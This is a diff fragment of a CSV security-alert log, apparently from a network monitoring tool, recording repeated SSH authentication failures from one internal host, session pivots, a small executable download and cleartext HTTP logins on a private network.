+Low,37476,2025-03-28T15:10:57Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.60.,SSH Authentication Failure,"2896,1881",,,10.0.242.127,10.0.4.60,,59394d74-0dfd-4452-8f87-e09a0ab33b38,
+Low,37478,2025-03-28T15:09:50Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.11.,SSH Authentication Failure,"1832,2896",,,10.0.242.127,10.0.4.11,,0f13e9d3-98e3-423b-81c9-40e0ec91f3c9,
+Low,37479,2025-03-28T15:09:50Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.29.,SSH Authentication Failure,"2896,1763",,,10.0.242.127,10.0.4.29,,fc5b0904-ad21-4321-b34d-3f90e713f86a,
+Low,37480,2025-03-28T15:10:05Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.59.,SSH Authentication Failure,"2896,1875",,,10.0.242.127,10.0.4.59,,cfbd4813-05bb-4673-9819-d19bd450ece2,
+Low,37481,2025-03-28T15:09:50Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.12.,SSH Authentication Failure,"2896,1829",,,10.0.242.127,10.0.4.12,,9704d136-530e-48ea-aae7-9693c91d3d42,
+Low,37612,2025-03-28T15:10:49Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1759 (10.0.4.43) to then pivot to asset 1825 (10.0.4.45) via TELNET.,Interactive Session Pivots,"2896,1825",,,10.0.242.127,10.0.4.45,,,
+Low,37616,2025-03-28T15:10:50Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1832 (10.0.4.11) to then pivot to asset 1763 (10.0.4.29) via RDP.,Interactive Session Pivots,"2896,1763",,,10.0.242.127,10.0.4.29,,,
+Medium,37634,2025-03-28T15:14:41Z,Indicator,Threat Behavior,HTTP Download Executable Smaller than 1 MB,HTTP Download Executable Smaller than 1 MB,HTTP Executable Download Signatures,"1763,2671",,,208.89.74.31,10.0.4.29,,Network Traffic,
+Low,37822,2025-03-28T15:17:54Z,Indicator,Configuration,HTTP POST Cleartext Auth Attempt,HTTP POST Cleartext Auth Attempt,HTTP Cleartext Authentication,"1881,2896",,,10.0.242.127,10.0.4.60,,Network Traffic,
+Medium,37823,2025-03-28T15:17:54Z,Indicator,Configuration,HTTP POST Cleartext Auth Success,HTTP POST Cleartext Auth Success,HTTP Cleartext Authentication,"1881,2896",,,10.0.4.60,10.0.242.127,,Network Traffic,
+Low,38329,2025-03-28T15:19:57Z,Communication,Configuration,X509 Certificate Seen for First Time,"Asset 4159 seen using a certificate that hasn't been observed before.
+ subject: 
+ issuer:",X509 Certificate First Seen,"1832,4159",,,52.123.243.215,10.0.4.11,,f99fd5c8-6f0b-4663-a8e5-9a7b9637a914,
+Low,38673,2025-03-28T15:22:24Z,Asset,Configuration,Detected 8 NewUserAgent between 2025-03-28T15:17:02.526Z and 2025-03-28T15:22:24.508Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: 62842248-30ce-49c9-b09f-20ca453abd95, 67c7c5db-358f-497b-97b8-f5ddc2813021, 3c137687-70b2-4b72-a573-52befca93680, 006ce32d-65d8-4057-80db-bb712cbd987d, aecd34a2-ea09-4bf0-989c-bd4d1df2a8db, 247493c2-2334-41bc-a9af-c1eb460b9aa2, 009f5510-4b2c-4d2b-bda6-c91662abd9e9, 04a5bb52-3ced-4920-b016-f6ee5cc1a09a;
+  src__mac: ;
+  src_ip: 10.0.4.11, 10.0.1.30, 10.0.4.12, 10.0.4.29, 10.0.3.44;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1829, 1832, 1707, 1763, 151;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Microsoft-Delivery-Optimization/10.0, curl/8.5.0, Microsoft Edge Update/1.3.195.45;winhttp, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0, Microsoft-CryptoAPI/10.0, Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.51;
+  src__ip: ;",User Agent First Seen,"1763,1832,1829,1707,151",,,,,"10.0.4.29,10.0.4.11,10.0.4.12,10.0.3.44,10.0.1.30","62842248-30ce-49c9-b09f-20ca453abd95, 67c7c5db-358f-497b-97b8-f5ddc2813021, 3c137687-70b2-4b72-a573-52befca93680, 006ce32d-65d8-4057-80db-bb712cbd987d, aecd34a2-ea09-4bf0-989c-bd4d1df2a8db, 247493c2-2334-41bc-a9af-c1eb460b9aa2, 009f5510-4b2c-4d2b-bda6-c91662abd9e9, 04a5bb52-3ced-4920-b016-f6ee5cc1a09a",
+Low,38708,2025-03-28T15:17:21Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.59.,SSH Authentication Failure,"2896,1875",,,10.0.242.127,10.0.4.59,,d0a037ff-c602-44a8-be08-4f63753156b2,
+Low,38711,2025-03-28T15:17:01Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.43.,SSH Authentication Failure,"1759,2896",,,10.0.242.127,10.0.4.43,,148cc370-8f0f-4d79-9250-4daa37ba7290,
+Low,38712,2025-03-28T15:17:01Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.11.,SSH Authentication Failure,"1832,2896",,,10.0.242.127,10.0.4.11,,85d17149-5708-4045-be0f-d1adbbf6a8b6,
+Low,38714,2025-03-28T15:16:09Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.44.,SSH Authentication Failure,"2896,1762",,,10.0.242.127,10.0.4.44,,91073240-af9d-4f1f-a91b-72f26b1ae8b6,
+Low,38719,2025-03-28T15:15:49Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.60.,SSH Authentication Failure,"2896,1881",,,10.0.242.127,10.0.4.60,,a08c99d9-f0bd-4f28-bb2e-c0ee8a314cd0,
+Low,38723,2025-03-28T15:15:48Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.45.,SSH Authentication Failure,"2896,1825",,,10.0.242.127,10.0.4.45,,cfd96e7c-c549-44c4-b3f3-29b514694556,
+Low,38724,2025-03-28T15:15:23Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.11.,SSH Authentication Failure,"1832,2896",,,10.0.242.127,10.0.4.11,,ebae2d39-8593-4304-b945-cb6c9a75b68a,
+Low,38730,2025-03-28T15:13:07Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.29.,SSH Authentication Failure,"1763,2896",,,10.0.242.127,10.0.4.29,,7aa80888-734c-43c0-9e77-46681630807e,
+Low,38732,2025-03-28T15:13:29Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.11.,SSH Authentication Failure,"1832,2896",,,10.0.242.127,10.0.4.11,,691dfb35-41c2-4dbe-ac3b-7ad4655539f2,
+Low,38735,2025-03-28T15:13:07Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.12.,SSH Authentication Failure,"1829,2896",,,10.0.242.127,10.0.4.12,,b2a8fc76-feff-409f-8a6c-ced615af1e38,
+Low,38942,2025-03-28T13:51:54Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,91899a7d-ffc9-478c-9f64-f2765cc2fa6f,
+Low,39337,2025-03-28T14:41:53Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,01c055e4-ffaf-489e-9cfa-c276f91fa0a1,
+Low,39338,2025-03-28T14:37:43Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,f8f78e3a-365c-4110-9536-3aaca3ef23a4,
+Low,39341,2025-03-28T14:37:12Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,d16c4c9d-4b32-47fc-a93c-6fc99374a511,
+Low,39385,2025-03-28T14:50:02Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,7dc381d4-e8a1-445c-be7b-fa872eddf0cd,
+Low,39416,2025-03-28T14:47:10Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,f8e145b7-56a0-4933-8b4d-5bc9d4d6ee6a,
+Low,39451,2025-03-28T13:43:25Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,07152fcf-0f30-4fba-a8e8-a0815c62500f,
